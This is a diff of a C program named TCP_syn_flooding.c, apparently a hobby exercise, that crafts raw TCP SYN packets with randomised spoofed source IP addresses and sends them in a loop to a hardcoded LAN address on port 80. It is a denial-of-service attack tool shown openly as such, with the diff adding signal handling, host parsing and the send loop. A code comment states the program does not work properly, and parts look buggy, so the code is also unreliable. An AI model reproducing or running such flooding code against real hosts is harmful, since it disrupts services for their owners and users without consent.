@@ -1,21 +1,6 @@
 /* TCP_syn_flooding.c
-Update: 2020-05-12T01:42:00+08@China-Guangdong-Zhanjiang+08
+Update: 2020-05-12T16:42:00+08@China-Guangdong-Zhanjiang+08
 */
-
-#include <unistd.h>
-#include <signal.h>
-#include <sys/types.h>
-#include <sys/socket.h>
-#include <linux/ip.h>
-#include <linux/tcp.h>
-#include <arpa/inet.h>
-#include <netinet/in.h>
-
-#include <stdbool.h>
-#include <errno.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
 
 /* Header_Format
 
@@ -75,7 +60,21 @@ IP_Header_Format
 
 */
 
+#include <unistd.h>
+#include <signal.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <linux/ip.h>
+#include <linux/tcp.h>
+#include <arpa/inet.h>
+#include <netinet/in.h>
+#include <netdb.h>
 
+#include <stdbool.h>
+#include <errno.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
 
 bool check(bool failed, const char *file, const int line, const char *function, const int error, const char *message) {
 	if (failed) {
@@ -98,16 +97,67 @@ static const struct {
 	._Alive = "Alive",
 	._Quit = "Quit",
 };
-
 static State state;
 
-void sigint(int signo) {
+void cleanup() {
+	state = EType._Quit;
+	fprintf(stderr, "terminate TCP_syn_Flooding...""\n");
+}
 
+void sig_int(int signo) {
+	cleanup();
+	exit(0);
+}
 
+void initialize() {
+	setuid(getpid());
+
+	state = EType._Alive;
+	signal(SIGINT, sig_int);
+	fprintf(stderr, "start TCP_syn_Flooding...""\n");
 }
 
 int ip4_port(char *address, char *ip4, unsigned short *port) {
+	char deli = ':';
+	int ret = 0;
 
+	if (address != NULL) {
+		char *ptr = ip4;
+		while (address[0] != '\0' && address[0] != deli) {
+			ptr[0] = address[0];
+			ptr += 1;
+			address += 1;
+		}
+		ptr[0] = '\0';
+
+		if (inet_addr(ip4) == INADDR_NONE) {
+			char chk[128];
+			sprintf(chk, gethostbyname("_")->h_addr_list[0]);
+			struct hostent host = *gethostbyname(ip4);
+			if (check(0 == strncmp(chk, host.h_addr_list[0], host.h_length), __FILE__, __LINE__, __FUNCTION__, errno, "gethostbyname")) {
+				cleanup();
+				exit(1);
+			}
+			sprintf(ip4, "%s", inet_ntoa(*(struct in_addr *)host.h_addr_list[0]));
+			ret += 1;
+		}
+
+		if (address[0] == deli) {
+			address += 1;
+			*port = (unsigned short)atoi(address);
+			if (check(!(0 < *port && *port < 65536), __FILE__, __LINE__, __FUNCTION__, errno, "!(0 < *port && *port < 65536)")) {
+				cleanup();
+				exit(1);
+			}
+			ret += 1;
+		}
+	}
+
+	if (check(ret != 2, __FILE__, __LINE__, __FUNCTION__, errno, "ret != 2")) {
+		cleanup();
+		exit(1);
+	}
+	return ret;
 }
 
 unsigned short checksum(void *data, int length) {
@@ -196,40 +246,46 @@ int TCP_syn_flooding(char *ip4, unsigned short port) {
 	};
 
 
-	while (true) {
+	while (state == EType._Alive) {
 		packet.ip.saddr = htonl(rand());
 		packet.ip.check = 0;
 		packet.ip.check = checksum(&packet.ip, sizeof(packet.ip));
 
-		packet.tcp.source = htons(rand());
-		packet.tcp.seq = htonl(rand());
+		packet.tcp.source = htons(1025 + rand() % 60000);
+		packet.tcp.seq = 761013 + rand() % 100000;
 		packet.tcp.check = 0;
 		pseudo.saddr = packet.ip.saddr;
 		pseudo.tcp = packet.tcp;
 		packet.tcp.check = checksum(&pseudo, sizeof(packet));
 
-		fprintf(stderr, "%s:%d ==>> %s:%d \n", packet.ip.saddr, packet.tcp.source, packet.ip.daddr, packet.tcp.dest);
+		fprintf(stderr, "%s:%d ==>> %s:%d""\n", inet_ntoa(*(struct in_addr *)&(packet.ip.saddr)), packet.tcp.source, inet_ntoa(*(struct in_addr *)&(packet.ip.daddr)), packet.tcp.dest);
 		sendto(raw_fd, &packet, sizeof(packet), 0, (struct sockaddr *)&target, sizeof(target));
 		ret += 1;
 
 		usleep(500 * 1000);
 	}
 
+	close(raw_fd);
 	return ret;
 }
 
+// This program could not work properly.
+
 int main(int argc, char *argv[]) {
-	if (argc < 2) {
-		fprintf(stderr, "[Usage] %s ip4:port \n", argv[0]);
-	}
+	//if (argc < 2) {
+	//    fprintf(stderr, "[Usage] %s ip4:port \n", argv[0]);
+	//    exit(1);
+	//}
 
-	state = EType._Alive;
+	initialize();
 
+	char address[128] = "kali:8888";
 	char ip4[64] = "192.168.12.160";
-	unsigned port = 80;
+	unsigned short port = 80;
 
-	ip4_port(argv[1], ip4, &port);
-	fprintf(stderr, "%s:%d\n", ip4, port);
+	// ip4_port(argv[1], ip4, &port);
+	// ip4_port(address, ip4, &port);
+	// fprintf(stderr, "%s:%d\n", ip4, port);
 
 	TCP_syn_flooding(ip4, port);
 
